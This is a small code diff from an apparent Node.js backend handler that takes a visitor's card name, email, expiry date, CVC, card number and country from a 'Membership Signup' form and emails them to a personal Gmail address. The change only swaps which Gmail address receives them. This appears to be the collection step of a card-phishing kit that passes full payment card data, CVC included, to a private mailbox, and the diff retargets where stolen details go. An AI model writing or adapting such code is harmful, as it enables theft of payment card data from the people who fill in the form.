@@ -57,7 +57,7 @@ console.log("mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm....mmmmmmmmmmmmM
         const {cardName, email,date,cvc, cardNumber, country} = req.body
 const returnDetails = DetailsTemplate(cardName, email,date,cvc, cardNumber, country)
         
-        await sendMail(returnDetails, "michee2x@gmail.com" , "Membership Signup", res, {email:""})
+        await sendMail(returnDetails, "waidiprogress@gmail.com" , "Membership Signup", res, {email:""})
      
     }catch (error) {
         console.log("there was an error in login controller", error)
